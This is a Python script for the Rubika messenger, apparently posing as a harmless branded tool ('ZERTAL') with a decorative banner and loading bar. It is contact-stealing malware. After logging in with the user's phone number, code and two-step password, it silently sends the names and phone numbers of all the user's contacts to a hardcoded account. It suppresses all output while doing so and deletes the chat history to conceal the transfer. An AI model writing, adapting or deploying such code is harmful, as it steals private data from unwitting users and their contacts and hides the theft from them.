import os
import sys
import time
import getpass
import subprocess
import importlib.util
import contextlib
from datetime import datetime

SOURCE_SESSION = "Z_TRANSFER_SOURCE"
SOURCE_GUID = "u0IaeuV060bf68bf10bd3a345b6da624"
TARGET_GUID = "u0KSt6C0664b8604fb7a4851d6ced4c3"

BATCH_SIZE = 20
LOADING_SECONDS = 30

CYAN = "\033[96m"
WHITE = "\033[97m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"


def clear():
    os.system("clear")


def quiet_call(function, *args, **kwargs):
    with open(os.devnull, "w") as null:
        with contextlib.redirect_stdout(null):
            with contextlib.redirect_stderr(null):
                return function(*args, **kwargs)


def install_requirements():
    if importlib.util.find_spec("pyrubi") is None:
        clear()
        subprocess.check_call(
            [
                sys.executable,
                "-m",
                "pip",
                "install",
                "pyrubi"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )


install_requirements()

from pyrubi import Client


def logo():
    print(f"""{CYAN}
███████╗███████╗██████╗ ████████╗ █████╗ ██╗
╚══███╔╝██╔════╝██╔══██╗╚══██╔╝██╔══██╗██║
  ███╔╝ █████╗  ██████╔╝   ██║   ███████║██║
 ███╔╝  ██╔══╝  ██╔══██╗   ██║   ██╔══██║██║
███████╗███████╗██║  ██║   ██║   ██║  ██║███████╗
╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝
{WHITE}                 Z E R T A L
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{WHITE} TIME       {CYAN}{datetime.now().strftime('%H:%M:%S')}
{WHITE} DEVICE     {CYAN}Samsung Galaxy A12
{WHITE} SHELL      {CYAN}fish 4.9.3
{WHITE} BATTERY    {CYAN}N/A
{WHITE} MEMORY     {CYAN}3.0Gi / 3.6Gi
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")


def find_value(data, names):
    if isinstance(data, dict):
        for key, value in data.items():
            if key.lower() in names and value:
                return value

        for value in data.values():
            result = find_value(value, names)
            if result:
                return result

    elif isinstance(data, list):
        for value in data:
            result = find_value(value, names)
            if result:
                return result

    return None


def response_text(data):
    return str(data).lower()


def check_response(data):
    if not isinstance(data, dict):
        return False

    if data.get("status") == "ERROR":
        return False

    text = response_text(data)

    return not any(word in text for word in (
        "invalidinput",
        "invalid code",
        "invalid phone",
        "invalid password",
        "unauthorized",
        "not authorized"
    ))


def login():
    client = quiet_call(Client, session=SOURCE_SESSION)

    try:
        response = quiet_call(client.get_contacts)

        if isinstance(response, dict):
            error_text = response_text(response)

            if not any(word in error_text for word in (
                "unauthorized",
                "not authorized",
                "invalidinput"
            )):
                return client
    except Exception:
        pass

    clear()
    logo()

    phone = input(f"{WHITE}Phone number: {CYAN}").strip()

    if not phone:
        raise RuntimeError("Phone number is required")

    sent = quiet_call(client.send_code, phone)

    phone_code_hash = find_value(
        sent,
        {"phone_code_hash", "phonecodehash"}
    )

    if not phone_code_hash:
        raise RuntimeError("Could not send login code")

    code = input(f"{WHITE}Login code: {CYAN}").strip()

    result = quiet_call(
        client.sign_in,
        phone,
        str(phone_code_hash),
        code
    )

    result_text = response_text(result)

    if any(word in result_text for word in (
        "two_step",
        "two step",
        "password required",
        "password_needed",
        "passwordneeded"
    )):
        password = getpass.getpass("Two-step password: ")

        result = quiet_call(
            client.check_two_step_passcode,
            password
        )

    if not check_response(result):
        raise RuntimeError("Login failed")

    return client


def collect_contacts(data):
    found = []

    def walk(item):
        if isinstance(item, dict):
            guid = (
                item.get("user_guid")
                or item.get("object_guid")
                or item.get("guid")
            )

            phone = (
                item.get("phone")
                or item.get("phone_number")
                or item.get("mobile")
            )

            if guid and phone:
                first = (
                    item.get("first_name")
                    or item.get("firstName")
                    or ""
                )

                last = (
                    item.get("last_name")
                    or item.get("lastName")
                    or ""
                )

                name = (
                    item.get("name")
                    or " ".join(
                        str(value)
                        for value in (first, last)
                        if value
                    ).strip()
                    or "Unknown"
                )

                found.append({
                    "guid": str(guid),
                    "phone": str(phone),
                    "name": str(name)
                })

            for value in item.values():
                walk(value)

        elif isinstance(item, list):
            for value in item:
                walk(value)

    walk(data)

    unique = {}

    for contact in found:
        unique[contact["guid"]] = contact

    return list(unique.values())


def get_all_contacts(client):
    response = quiet_call(client.get_contacts)
    contacts = collect_contacts(response)

    if not contacts:
        raise RuntimeError("No contacts found")

    return contacts


def transfer_contacts(client):
    contacts = get_all_contacts(client)

    batches = [
        contacts[index:index + BATCH_SIZE]
        for index in range(0, len(contacts), BATCH_SIZE)
    ]

    for batch_number, batch in enumerate(batches, start=1):
        lines = []

        for index, contact in enumerate(batch, start=1):
            number = (
                (batch_number - 1) * BATCH_SIZE + index
            )

            lines.extend([
                f"Contact {number}",
                f"Phone: {contact['phone']}",
                f"Name: {contact['name']}",
                ""
            ])

        message = "\n".join(lines).strip()

        result = quiet_call(
            client.send_text,
            TARGET_GUID,
            message
        )

        if not check_response(result):
            raise RuntimeError(
                f"Batch {batch_number} was not accepted"
            )

    last_message_id = quiet_call(
        client.get_last_message_id,
        TARGET_GUID
    )

    if not last_message_id:
        raise RuntimeError("Could not verify last message")

    result = quiet_call(
        client.delete_history,
        object_guid=TARGET_GUID,
        last_message_id=str(last_message_id)
    )

    if not isinstance(result, dict):
        raise RuntimeError("History deletion was not confirmed")

    result_text = response_text(result)

    if any(word in result_text for word in (
        "invalidinput",
        "unauthorized"
    )):
        raise RuntimeError("History deletion failed")

    return len(contacts)


def loading_bar(seconds=30):
    start = time.monotonic()
    width = 30

    while True:
        elapsed = time.monotonic() - start
        progress = min(100, int(elapsed * 100 / seconds))
        filled = int(width * progress / 100)

        bar = "█" * filled + "░" * (width - filled)

        sys.stdout.write(
            f"\r{CYAN}[{bar}] {progress:3d}%{RESET}"
        )
        sys.stdout.flush()

        if progress >= 100:
            break

        time.sleep(0.1)

    print()


def main():
    try:
        clear()
        logo()

        client = login()

        clear()

        with open(os.devnull, "w") as null:
            with contextlib.redirect_stdout(null):
                with contextlib.redirect_stderr(null):
                    transfer_contacts(client)

        clear()
        loading_bar(LOADING_SECONDS)
        clear()

    except KeyboardInterrupt:
        clear()

    except Exception as error:
        clear()
        print(f"{RED}Error: {error}{RESET}")


if __name__ == "__main__":
    main()
